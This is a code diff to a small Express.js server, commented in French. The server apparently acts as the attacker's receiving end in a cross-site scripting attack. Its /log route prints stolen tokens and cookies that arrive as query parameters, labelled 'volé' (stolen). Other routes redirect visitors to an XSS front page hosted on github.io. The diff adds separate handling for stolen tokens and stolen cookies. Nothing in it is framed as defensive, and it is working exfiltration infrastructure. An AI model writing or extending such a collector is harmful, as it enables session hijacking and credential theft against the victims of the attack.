@@ -1,22 +1,28 @@
 const express = require('express');
 const app = express();
 
-// Route pour logger les cookies volés
 app.get('/log', (req, res) => {
-  console.log('[+] Cookie volé:', req.url);
-  res.send('Cookie reçu, merci !');
-});
+  
+  const query = req.query;
 
+  if (query.token) {
+    console.log('[+] Token volé:', query.token);
+  } else if (query.cookie) {
+    console.log('[+] Cookie volé:', query.cookie);
+  } else {
+    console.log('[+] Données reçues:', req.url);
+  }
+
+  res.send('Données reçues, merci !');
+});
 
 app.get('/', (req, res) => {
-  res.redirect('https://aket0.github.io/xss-front/xss.html'); // ← adapte à ton vrai repo si différent
+  res.redirect('https://aket0.github.io/xss-front/xss.html');
 });
-
 
 app.get('/xss', (req, res) => {
-  res.redirect('https://aket0.github.io/xss-front/xss.html'); 
+  res.redirect('https://aket0.github.io/xss-front/xss.html');
 });
-
 
 app.listen(5000, '0.0.0.0', () => {
   console.log('Serveur de logs démarré sur http://0.0.0.0:5000');
